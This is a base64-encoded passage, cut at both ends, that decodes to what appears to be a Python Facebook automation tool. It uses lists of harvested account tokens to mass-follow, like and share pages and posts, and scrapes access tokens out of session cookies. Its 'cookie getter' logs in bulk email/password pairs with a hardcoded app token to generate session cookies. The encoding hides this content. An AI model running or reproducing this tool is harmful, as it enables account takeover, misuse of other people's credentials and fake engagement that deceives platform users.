iAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgCiAgICBwcmludChmIiIiICAgICB7d2hpdGV9Q0hPT1NFIFRZUEUgT0YgUkVBQ1RPUlM6IAogICAgIHtibHVlfVsxXSB7Z3JlZW59RlJBIEFDQ09VTlQgCiAgICAge2JsdWV9WzJdIHtncmVlbn1GUkEgUEFHRVMKICAgICB7Ymx1ZX1bM10ge2dyZWVufVJQVyBBQ0NPVU5UCiAgICAge2JsdWV9WzRdIHtncmVlbn1SUFcgUEFHRVMKICAgICB7cmVkfVswXSAge3JlZH0gRVhJVCAKICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICAKICAgIHRyeToKICAgICAgICBmaWxlX2Nob2ljZSA9IGludChpbnB1dChmIiAgICB7Z3JlZW59Q2hvb3NlOiAgIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgZmlsZV9jaG9pY2Ugbm90IGluIGZpbGVfb3B0aW9uczoKICAgICAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGZpbGVfcGF0aCA9IGZpbGVfb3B0aW9uc1tmaWxlX2Nob2ljZV0KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgMTogTG9hZCB0b2tlbnMgYW5kIGRpc3BsYXkgdGhlIHRvdGFsCiAgICB0b2tlbnMgPSBsb2FkX3Rva2VucyhmaWxlX3BhdGgpCiAgICB0b3RhbF90b2tlbnMgPSBsZW4odG9rZW5zKQogICAgCiAgICBpZiB0b3RhbF90b2tlbnMgPT0gMDoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGF2YWlsYWJsZSBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlLiIpCiAgICAgICAgcmV0dXJuCgogICAgCgogICAgIyBTdGVwIDI6IEFzayBmb3IgdGhlIHN0YXJ0aW5nIGxpbmUKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHt0b3RhbF90b2tlbnN9e3JlZH0pOiAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBzdGFydF9saW5lIDwgMSBvciBzdGFydF9saW5lID4gdG90YWxfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge3RvdGFsX3Rva2Vuc30uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBBZGp1c3QgdGhlIHRva2VucyBiYXNlZCBvbiB0aGUgc3RhcnRpbmcgbGluZQogICAgdG9rZW5zID0gdG9rZW5zW3N0YXJ0X2xpbmUgLSAxOl0KCiAgICAjIFN0ZXAgMzogR2V0IHRoZSBwYWdlIElECiAgICB1aWQgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgdGhlIFBhZ2UvUHJvZmlsZSBVSUQ6ICIpLnN0cmlwKCkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgaWYgbm90IHVpZC5pc2RpZ2l0KCk6CiAgICAgICAgcHJpbnQoIkludmFsaWQgVUlELiBQbGVhc2UgZW5zdXJlIHlvdSBlbnRlcmVkIGEgY29ycmVjdCBudW1lcmljIFVJRC4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCA0OiBHZXQgdGhlIG51bWJlciBvZiBhY3Rpb25zCiAgICB0cnk6CiAgICAgICAgbnVtX2FjdGlvbnMgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUxJTUlUIHtyZWR9KG5vdCBleGNlZWRpbmcge3RvdGFsX3Rva2Vuc30pOiAiKS5zdHJpcCgpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIG51bV9hY3Rpb25zID4gdG90YWxfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIkl0IGV4Y2VlZHMgdGhlIGxpbWl0IG9mIHt0b3RhbF90b2tlbnN9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIkludmFsaWQgaW5wdXQuIFBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBmb3IgdGhlIGFjdGlvbnMuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0ZXAgNTogUGVyZm9ybSBhY3Rpb25zIHVzaW5nIG11bHRpdGhyZWFkaW5nCiAgICBhY3Rpb25fY291bnQgPSAwCiAgICB0YXNrcyA9IFtdCgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MikgYXMgZXhlY3V0b3I6CiAgICAgICAgZm9yIHRva2VuIGluIHRva2Vuc1s6bnVtX2FjdGlvbnNdOiAgIyBMaW1pdCB0aGUgdG9rZW5zIHRvIHRoZSBudW1iZXIgb2YgYWN0aW9ucyByZXF1ZXN0ZWQKICAgICAgICAgICAgZnV0dXJlID0gZXhlY3V0b3Iuc3VibWl0KGZvbGxvd19hbmRfbGlrZV9mYWNlYm9va19wYWdlLCB1aWQsIHRva2VuLnNwbGl0KCd8JylbMV0pICAjIEFzc3VtaW5nIHRva2VuIGZvcm1hdCBpcyBlbWFpbHxhY2Nlc3NfdG9rZW4KICAgICAgICAgICAgdGFza3MuYXBwZW5kKGZ1dHVyZSkKICAgICAgICAgICAgYWN0aW9uX2NvdW50ICs9IDEKCiAgICAgICAgIyBXYWl0IGZvciBhbGwgdGFza3MgdG8gY29tcGxldGUKICAgICAgICBmb3IgdGFzayBpbiBhc19jb21wbGV0ZWQodGFza3MpOgogICAgICAgICAgICB5ID0gdG9rZW4uc3BsaXQoJ3wnKVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB0YXNrLnJlc3VsdCgpICAjIFRvIHJhaXNlIGFueSBleGNlcHRpb25zIGlmIG9jY3VycmVkIGR1cmluZyBleGVjdXRpb24KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJBbiBlcnJvciBvY2N1cnJlZCBkdXJpbmcgZXhlY3V0aW9uOiB7c3RyKGUpfSIpCgogICAgcHJpbnQoZiIgICAgIHtyZWR9SUQge3doaXRlfToge2JsdWV9e3l9IHwge2dyZWVufVxuU1VDQ0VTU0ZVTExZIEZPTExPV0VEIEFORCBMSUtFRCB8IElEOiIsIHVpZCkKICAgIHByaW50KGYiQ29tcGxldGVkIHthY3Rpb25fY291bnR9IHJlcXVlc3RlZCBhY3Rpb25zLiIpCgojIENhbGwgdGhlIG1ldGhvZCB0byBleGVjdXRlIHRoZSBmdW5jdGlvbmFsaXR5CmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3lzCmltcG9ydCB0aW1lCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IKCmdvbWVfdG9rZW4gPSBbXQoKZGVmIHRva3ooaW5wdXRfY29va2llcyk6CiAgICBmb3IgY29va2llIGluIGlucHV0X2Nvb2tpZXM6CiAgICAgICAgaGVhZGVyXyA9IHsKICAgICAgICAgICAgJ2F1dGhvcml0eSc6ICdidXNpbmVzcy5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOScsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLAogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgICAgICAgICAnY29va2llJzogY29va2llLAogICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5mYWNlYm9vay5jb20vJywKICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMDMiLCAiQ2hyb21pdW0iO3Y9IjEwMyInLAogICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsCiAgICAgICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIkxpbnV4IicsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdkb2N1bWVudCcsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsCiAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIGhvbWVfYnVzaW5lc3MgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tL2NvbnRlbnRfbWFuYWdlbWVudCcsIGhlYWRlcnM9aGVhZGVyXykudGV4dAogICAgICAgICAgICB0b2tlbiA9IGhvbWVfYnVzaW5lc3Muc3BsaXQoJ0VBQUcnKVsxXS5zcGxpdCgnIiwiJylbMF0KICAgICAgICAgICAgY29va2llX3Rva2VuID0gZid7Y29va2llfXxFQUFHe3Rva2VufScKICAgICAgICAgICAgZ29tZV90b2tlbi5hcHBlbmQoY29va2llX3Rva2VuKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgcmV0dXJuIGdvbWVfdG9rZW4KCmRlZiBzaGFyZSh0YWNoLCBpZF9zaGFyZSk6CiAgICBjb29raWUgPSB0YWNoLnNwbGl0KCd8JylbMF0KICAgIHRva2VuID0gdGFjaC5zcGxpdCgnfCcpWzFdCiAgICBoZSA9IHsKICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAnY29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAnY29udGVudC1sZW5ndGgnOiAnMCcsCiAgICAgICAgJ2Nvb2tpZSc6IGNvb2tpZSwKICAgICAgICAnaG9zdCc6ICdncmFwaC5mYWNlYm9vay5jb20nCiAgICB9CiAgICB0cnk6CiAgICAgICAgcmVxdWVzdHMucG9zdChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQ/bGluaz1odHRwczovL20uZmFjZWJvb2suY29tL3tpZF9zaGFyZX0mcHVibGlzaGVkPTAmYWNjZXNzX3Rva2VuPXt0b2tlbn0nLCBoZWFkZXJzPWhlKS5qc29uKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpkZWYgc2hhcigpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGlucHV0X2Nvb2tpZXMgPSBpbnB1dChmIiAgICAge2dyZWVufUVudGVyIENvb2tpZTogIFx4MWJbMzg7MjsyMzM7MjMzOzIzM20iKS5zcGxpdCgnLCcpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGlkX3NoYXJlID0gaW5wdXQoZiIgICAgIHtncmVlbn1FbnRlciBQb3N0IElEOiBceDFiWzM4OzI7MjMzOzIzMzsyMzNtIikKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgdG90YWxfc2hhcmUgPSBpbnQoaW5wdXQoZiIgICAge2dyZWVufUhvdyBNYW55IFNoYXJlOiBceDFiWzM4OzI7MjMzOzIzMzsyMzNtIikpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGRlbGF5ID0gaW50KGlucHV0KGYiICAgIHtncmVlbn0gRGVsYXkgU2hhcmU6IFx4MWJbMzg7MjsyMzM7MjMzOzIzM20iKSkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcHJpbnQoJ1x4MWJbMzg7MjsxNzM7MjU1OzQ3bVsqXSBceDFiWzM4OzI7MjMzOzIzMzsyMzNtd2FpdGluZy4uLicsIGVuZD0nXHInKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgYWxsID0gdG9reihpbnB1dF9jb29raWVzKQogICAgdG90YWxfbGl2ZSA9IGxlbihhbGwpCiAgICBwcmludChmJ1x4MWJbMzg7MjsxNzM7MjU1OzQ3bUxpdmU6IFx4MWJbMzg7MjsyMzM7MjMzOzIzM217dG90YWxfbGl2ZX0gXHgxYlszODsyOzE3MzsyNTU7NDdtQ29va2llcycpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIAogICAgaWYgdG90YWxfbGl2ZSA9PSAwOgogICAgICAgIHN5cy5leGl0KCkKCiAgICBwcmludChmIiAgICB7Z3JlZW594pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzdHQgPSAwCgogICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MjAwMCkgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlcyA9IFtdCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgZm9yIHRhY2ggaW4gYWxsOgogICAgICAgICAgICAgICAgaWYgc3R0ID49IHRvdGFsX3NoYXJlOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBmdXR1cmVzLmFwcGVuZChleGVjdXRvci5zdWJtaXQoc2hhcmUsIHRhY2gsIGlkX3NoYXJlKSkKICAgICAgICAgICAgICAgIHN0dCArPSAxCiAgICAgICAgICAgICAgICBwcmludChmJ1x4MWJbMzg7MjsxNzM7MjU1OzQ3bVNoYXJlOiArIFx4MWJbMzg7MjsyMzM7MjMzOzIzM217c3R0fScsIGVuZD0nXHInKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChkZWxheSkKICAgICAgICAgICAgaWYgc3R0ID49IHRvdGFsX3NoYXJlOgogICAgICAgICAgICAgICAgYnJlYWsKCiAgICBnb21lX3Rva2VuLmNsZWFyKCkKICAgIGlucHV0KCdceDFiWzM4OzI7MTczOzI1NTs0N21bKl0gXHgxYlszODsyOzIzMzsyMzM7MjMzbUVudGVyXl5cMDMzWzBtJykKCmltcG9ydCBvcwppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHV1aWQKaW1wb3J0IHJhbmRvbQpmcm9tIHJlcXVlc3RzIGltcG9ydCBwb3N0IGFzIHB0CmZyb20gcmljaCBpbXBvcnQgcHJpbnQgYXMgcnAKZnJvbSByaWNoLnBhbmVsIGltcG9ydCBQYW5lbCBhcyBwYW4KCgoKaW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdXVpZAppbXBvcnQgcmFuZG9tCmZyb20gcmVxdWVzdHMgaW1wb3J0IHBvc3QgYXMgcHQKZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBycApmcm9tIHJpY2gucGFuZWwgaW1wb3J0IFBhbmVsIGFzIHBhbgppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IG9zCmltcG9ydCByYW5kb20KaW1wb3J0IHV1aWQKZGFya2JsdWUgPSAiXDAzM1szNG0iCmdyZWVuID0gIlwwMzNbMTszMm0iCnJlZCA9ICJcMDMzWzE7MzFtIgp5ZWxsb3cgPSAiXDAzM1sxOzMzbSIKc2t5Ymx1ZSA9ICJcMDMzWzE7MzZtIgpibHVlID0gIlwwMzNbMTszNG0iCmxpZ2h0Ymx1ZSA9ICJcMDMzWzM4OzU7ODFtIgp3aGl0ZSA9ICJcMDMzWzE7MzdtIgpSID0gIlwwMzNbMzFtIiAgIyBSZWQKRyA9ICJcMDMzWzMybSIgICMgR3JlZW4KWSA9ICJcMDMzWzMzbSIgICMgWWVsbG93CkIgPSAiXDAzM1szNG0iICAjIEJsdWUKTSA9ICJcMDMzWzM1bSIgICMgTWFnZW50YQpQID0gIlwwMzNbMzZtIiAgIyBDeWFuCkMgPSAiXDAzM1szN20iICAjIFdoaXRlCmRlZiBjbGVhcl9zY3JlZW4oKToKICAgIGlmICd0ZXJtdXgnIGluIHBsYXRmb3JtLnN5c3RlbSgpLmxvd2VyKCk6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBlbGlmIHBsYXRmb3JtLnN5c3RlbSgpLmxvd2VyKCkgPT0gJ3dpbmRvd3MnOgogICAgICAgIG9zLnN5c3RlbSgnY2xzJykKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCgpkZWYgcmFuZGMoKToKICAgIHJldHVybiByYW5kb20uY2hvaWNlKFtSLCBHLCBZLCBCLCBNLCBQLCBDXSkKCmRlZiBsb2dvKCk6CiAgICBycChwYW4oZiIiIntyYW5kYygpfQoK4paI4paI4pWX4paR4paR4paR4paI4paI4pWX4paI4paI4pWX4paR4paR4paR4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWX4paR4paR4paI4paI4pWXCuKVmuKWiOKWiOKVl+KWkeKWiOKWiOKVlOKVneKWiOKWiOKVkeKWkeKWkeKWkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkQrilpHilZrilojilojilojilojilZTilZ3ilpHilojilojilZHilpHilpHilpHilojilojilZHilZrilojilojilojilojilojilZfilpHilojilojilojilojilojilojilojilZEK4paR4paR4pWa4paI4paI4pWU4pWd4paR4paR4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRCuKWkeKWkeKWkeKWiOKWiOKVkeKWkeKWkeKWkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkeKWkeKWkeKWiOKWiOKVkQrilpHilpHilpHilZrilZDilZ3ilpHilpHilpHilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilZrilZDilZ3ilpHilpHilZrilZDilZ0KICAgICAgICAgICAgICAgICAgIiIiLAogICAgICAgICAgIHRpdGxlPWYie1l9Q09PS0lFIEdFVFRFUiIsIHN1YnRpdGxlPWYie1J9REVWRUxPUCBCWSBZIFUgUyBIICIsIGJvcmRlcl9zdHlsZT0iYm9sZCB5ZWxsb3ciKSkKCmRlZiBjbGVhcigpOgogICAgb3Muc3lzdGVtKCdjbHMnIGlmIG9zLm5hbWUgPT0gJ250JyBlbHNlICdjbGVhcicpCgpkZWYgZ2V0X2ZpbGVfcGF0aCgpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHJldHVybiBpbnB1dChmIiAgICAge2dyZWVufXtDfShFbnRlciBwYXRoIHRvIGZpbGUgd2l0aCBlbWFpbCBhbmQgcGFzc3dvcmQpOn4gIikKcHJpbnQoZiIgICIpCgpkZWYgZ2V0X2Nvb2tpZV9zdG9yYWdlX3BhdGgoKToKICAgIHByaW50KGYiICAgIHtyZWR94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICByZXR1cm4gaW5wdXQoZiIgICAgIHt5ZWxsb3d9e0N9KEVudGVyIHBhdGggdG8gc3RvcmUgY29va2llcyk6fiAiKQoKZGVmIHJlYWRfY3JlZGVudGlhbHMoZmlsZV9wYXRoKToKICAgIGNyZWRlbnRpYWxzID0gW10KICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgICAgICBmb3IgbGluZSBpbiBsaW5lczoKICAgICAgICAgICAgbGluZSA9IGxpbmUuc3RyaXAoKQogICAgICAgICAgICBpZiAnfCcgaW4gbGluZToKICAgICAgICAgICAgICAgIHVpZCwgcGFzc3dvcmQgPSBsaW5lLnNwbGl0KCd8JywgMSkKICAgICAgICAgICAgICAgIGNyZWRlbnRpYWxzLmFwcGVuZCgodWlkLnN0cmlwKCksIHBhc3N3b3JkLnN0cmlwKCkpKQogICAgICAgICAgICBlbGlmIGxpbmU6CiAgICAgICAgICAgICAgICBwcmludChmIldhcm5pbmc6IFNraXBwaW5nIGludmFsaWQgbGluZSBmb3JtYXQ6IHtsaW5lfSIpCiAgICAgICAgICAgICAgICAKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3I6IEZpbGUgbm90IGZvdW5kIHtmaWxlX3BhdGh9OiB7c3RyKGUpfSIpCiAgICAKICAgCiAgICByZXR1cm4gY3JlZGVudGlhbHMKCgpkZWYgY3VzZXIodXNlciwgcGFzc3cpOgogICAgYWNjZXNzVG9rZW4gPSAnMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJwogICAgZGF0YSA9IHsKICAgICAgICAnYWRpZCc6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICdmb3JtYXQnOiAnanNvbicsCiAgICAgICAgJ2RldmljZV9pZCc6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICdjcGwnOiAndHJ1ZScsCiAgICAgICAgJ2ZhbWlseV9kZXZpY2VfaWQnOiBzdHIodXVpZC51dWlkNCgpKSwKICAgICAgICAnY3JlZGVudGlhbHNfdHlwZSc6ICdkZXZpY2VfYmFzZWRfbG9naW5fcGFzc3dvcmQnLAogICAgICAgICdlbWFpbCc6IHVzZXIsCiAgICAgICAgJ3Bhc3N3b3JkJzogcGFzc3csCiAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc1Rva2VuLAogICAgICAgICdnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXMnOiAnMScsCiAgICAgICAgJ21ldGhvZCc6ICdhdXRoLmxvZ2luJywKICAgIH0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgJ1VzZXItQWdlbnQnOiAiRGFsdmlrLzIuMS4wIChMaW51eDsgVTsgQW5kcm9pZCA4LjAuMDsgU00tQTcyMEYgQnVpbGQvUjE2TlcpIFtGQkFOL09yY2EtQW5kcm9pZDtGQkFWLzE5Ni4wLjAuMjkuOTk7RkJQTi9jb20uZmFjZWJvb2sub3JjYTtGQkxDL2VuX1VTO0ZCQlYvMTM1Mzc0NDc5O0ZCQ1IvU01BUlQ7RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQkRWL1NNLUE3MjBGO0ZCU1YvOC4wLjA7RkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO0ZC